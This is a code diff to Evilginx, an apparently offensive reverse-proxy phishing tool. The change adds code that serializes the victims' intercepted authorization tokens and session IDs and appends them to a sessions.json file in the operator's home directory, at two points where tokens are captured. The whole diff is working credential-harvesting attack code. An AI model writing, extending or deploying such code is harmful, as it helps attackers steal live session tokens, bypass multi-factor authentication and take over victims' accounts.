@@ -761,7 +761,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
             }
             if is_auth {
                 // we have all auth tokens
-                log.Success("[%d] all authorization tokens intercepted!", ps.Index)
+                if s, ok := p.sessions[ps.SessionId]; ok {
+                    log.Success("[%d] all authorization tokens intercepted!", ps.Index)
+                    captured_session := CapturedSession{}
+                    captured_session.RId = s.RId
+                    captured_session.Tokens = s.Tokens
+                    data, _ := json.Marshal(captured_session)
+                    usr, _ := user.Current()
+                    sessions_file, err := os.OpenFile(filepath.Join(filepath.Join(usr.HomeDir, ".evilginx"), "sessions.json"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0777)
+                    if err != nil {
+                        log.Error("sessions_file: %s", err)
+                    }
+                    sessions_file.Write(data)
+                    sessions_file.Write([]byte("\n"))
+                    //fmt.Printf("[*] Printing tokens test: %s\n", string(data))
+                }
             }
 
             // modify received body
@@ -887,6 +901,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                             }
                             if err == nil {
                                 log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
+                                captured_session := CapturedSession{}
+                                captured_session.RId = s.RId
+                                captured_session.Tokens = s.Tokens
+                                data, _ := json.Marshal(captured_session)
+                                usr, _ := user.Current()
+                                sessions_file, err := os.OpenFile(filepath.Join(filepath.Join(usr.HomeDir, ".evilginx"), "sessions.json"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0777)
+                                if err != nil {
+                                    log.Error("sessions_file: %s", err)
+                                }
+                                sessions_file.Write(data)
+                                sessions_file.Write([]byte("\n"))
+                                //fmt.Printf("[*] Printing tokens test: %s\n", string(data))
                             }
                             break
                         }
